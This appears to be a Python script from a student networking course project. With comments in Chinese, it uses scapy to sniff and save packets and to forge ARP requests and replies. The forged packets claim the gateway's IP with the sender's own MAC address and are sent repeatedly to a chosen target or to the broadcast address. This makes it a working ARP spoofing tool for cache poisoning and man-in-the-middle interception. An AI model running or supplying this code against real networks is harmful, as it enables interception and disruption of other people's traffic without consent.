# -*- coding: UTF-8 -*-

import sys
from optparse import OptionParser
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp,
    sniff,
    wrpcap
)

def get_bag(bag_num, f_mode):
    # 抓包
    # dpkt = sniff(filter = "tcp", count = 1, prn = lambda x: x.show())  # 只接收tcp的包
    # dpkt = sniff(filter="host 192.168.43.1", count = 1, prn = lambda x: x.summary())  # 只接收tcp的包
    if f_mode == 0:
        dpkt = sniff(count = bag_num, prn= lambda x: x.summary())
    elif f_mode == 1:
        dpkt = sniff(filter="tcp", count = bag_num, prn= lambda x: x.summary())
    elif f_mode == 2:
        dpkt = sniff(filter="udp", count = bag_num, prn= lambda x: x.summary())
    elif f_mode == 3:
        dpkt = sniff(filter="tcp and udp", count = bag_num, prn= lambda x: x.summary())
        
    wrpcap('/home/roxbili/Desktop/Computer_course_design/demo.pcap', dpkt)  # 将上述抓取的包保存为pcap格式。
    return dpkt

def ARP_creatpac(gatewayip, target_ip=None, my_interface="wlo1", mode="rep"):
    # get_if_hwaddr为获取本机网络接口的函数，getmacbyip是通过ip地址获取其Mac地址的方法，ARP是构建ARP数据包的类，Ether用来构建以太网数据包，sendp方法在第二层发送数据包。
    mac = get_if_hwaddr(my_interface)

    # 构建请求包
    def build_req():
        if target_ip is None:
            # 若无目标地址，则广播数据包
            pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=gatewayip, op=1)
        elif target_ip:
            target_mac = getmacbyip(target_ip)
            if target_mac is None:
                print("[-] Error: Could not resolve targets MAC address.")
                sys.exit(1)
            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=gatewayip, hwdst=target_mac, pdst=target_ip, op=1)

        return pkt

    def build_rep():
        if target_ip is None:
            pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=gatewayip, op=2)
        elif target_ip:
            target_mac = getmacbyip(target_ip)
            if target_mac is None:
                print("[-] Error: Could not resolve targets MAC address.")
                sys.exit(1)
            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=gatewayip, hwdst=target_mac, pdst=target_ip, op=2)

        return pkt

    # 检查用户输入所要求的模式
    if mode == "req":
        pkt = build_req()
    if mode == "rep":
        pkt = build_rep()

    return pkt

def ARP_sendpac(pkt, my_interface):
    sendp(pkt, inter=2, iface=my_interface)